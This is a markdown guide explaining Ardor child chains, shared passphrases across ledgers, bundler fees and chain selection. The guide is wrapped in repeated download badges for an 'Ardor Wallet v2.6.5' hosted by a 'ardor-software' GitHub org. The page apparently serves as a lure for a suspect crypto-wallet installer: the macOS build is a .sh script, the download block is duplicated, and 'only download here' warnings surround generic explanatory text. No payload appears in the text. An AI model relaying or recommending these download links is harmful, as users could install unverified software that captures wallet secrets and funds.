![Ardor Wallet guide](assets/banner-article.png)

# Ardor child chains explained, including one passphrase for all

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A child chain is an application chain that runs on Ardor while inheriting the security of the parent chain. Ignis, Nxt, Bitswift and Triffic are the ones the wallet opens, each with a token and a history of its own, and all of them are reached with the same passphrase that opens your ARDR account.

## What a child chain actually is

The parent chain is where blocks are produced and where [ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) pays for space. A child chain is a separate ledger of transactions and balances that is bundled onto the parent chain rather than secured by its own miners or forgers.

That distinction is the reason a child chain can exist without a security budget of its own. It does not need to attract validators, because the validators it relies on are already producing Ardor blocks. What it does need is a [bundler](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md): a service that takes child chain transactions, groups them, and pays the ARDR fee to put the bundle on the parent chain.

## Which chains the wallet supports

| Chain | What it is | Token |
|---|---|---|
| Ardor parent chain | The secured ledger and the fee layer | ARDR |
| Ignis | The first child chain, with the platform's feature set | IGNIS |
| Nxt | The former standalone chain, migrated onto Ardor | NXT |
| Bitswift | A community child chain | Its own token |
| Triffic | A child chain built around location-based rewards | Its own token |

The wallet shows them as a selector. Switching chains changes the ledger you are reading, not the account you are using, which is why the same address appears with a different [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) on each.

## One passphrase, several ledgers

This is the part that confuses people most, and the explanation is simpler than the effect. The account is derived from your secret once, and the same account ID is used across the chains the platform runs. One secret therefore opens ARDR, [Ignis](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md), Nxt and the rest.

What differs is the balance. Each chain keeps its own records, so an account can hold ARDR on the parent chain, IGNIS on Ignis and NXT on the Nxt child chain at the same time, and each figure appears only when the matching chain is selected.

There is no separate login for a child chain and nothing to import. A user who expects to "add" Ignis to a wallet is looking for a step that does not exist.

## How fees work across the chains

Fees are where the design becomes visible. A parent chain transaction pays its fee in ARDR directly. A child chain transaction pays its fee in the child chain's own token, and a bundler converts that arrangement into an ARDR payment on the parent chain.

The consequence is that a user can operate entirely inside Ignis without ever buying ARDR, because the bundler covers the parent chain fee. The same user still benefits from ARDR's security, since that is what the parent chain provides.

Bundling is not free, and it is not automatic. Bundlers set a minimum rate and a fee limit, and a transaction whose fee is below the minimum waits or fails. That is the usual explanation for a child chain transaction that does not appear.

## Why the design matters

Running one chain per application means every application needs its own security, which most cannot afford. Concentrating security on a parent chain and letting applications live beside it is Ardor's answer, and the child chain model is the mechanism that makes it practical.

For a user, the benefit is that a token issued on Ignis, a marketplace listing, or a poll does not require a separate network, a separate wallet or a separate fee asset. For a developer, it means the security question is already answered.

## Selecting a chain in the wallet

1. Open the wallet and unlock the account.
2. Use the chain selector to choose the ledger you want to read.
3. Check the balance shown against the chain you expect; a zero on one chain says nothing about another.
4. Switch back to the parent chain before sending ARDR, since a send is always made on the selected chain.

The fourth step is the one that produces support questions. An ARDR send attempted while a child chain is selected is not a transfer between chains; it is either refused or made on the wrong ledger entirely.

## A child chain is not a copy of the parent

A common misreading is that a child chain holds a copy of the parent chain's balances. It does not. Each ledger records its own transactions, and the only things they share are the account identity derived from your secret and the security provided by Ardor's forgers.

That is why a token issued on Ignis cannot be spent on Ardor, why an ARDR balance is invisible while a child chain is selected, and why a transaction on one chain has no effect on another. The wallet makes switching easy, which makes the separation easy to forget - and forgetting it is behind most of the zero-balance questions people ask.

## FAQ

### Do I need a separate wallet for Ignis?

No. The same wallet opens Ignis and every other supported child chain with the same secret. There is nothing to install and nothing to import.

### Is a child chain the same as a sidechain?

The mechanics differ: a child chain uses its own token for fees and relies on bundlers to reach the parent chain. The wallet treats these as separate ledgers either way.

### Why does my balance show zero on one chain?

Because the balance belongs to another ledger. Select the chain where the funds were received, and check the address matches the account you expect.

### Can I send ARDR to a child chain address?

ARDR lives on the parent chain. Sending requires the parent chain selected, and a child chain transaction is a different operation with its own token.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [How Ardor bundling works](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md)
- [What happened to the Nxt chain, and where the token is now](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-happened-to-the-nxt-chain-on-ardor.md)
- [What the Ardor blockchain is, how it works, and what else is called Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ardor-blockchain-platform.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
